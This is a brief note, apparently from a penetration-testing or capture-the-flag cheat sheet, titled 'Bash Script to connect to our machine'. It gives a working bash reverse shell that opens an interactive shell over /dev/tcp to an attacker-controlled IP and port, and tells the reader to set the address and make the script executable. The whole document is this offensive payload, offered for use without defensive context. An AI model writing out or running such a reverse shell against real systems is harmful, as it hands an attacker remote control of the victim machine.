----
##### Bash Script to connect to our machine

> Set the [[IP]] address and [[Port]].
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```
>`script.sh`

> Make sure the file is executable.
```shell
chmod +x script.sh
```

---
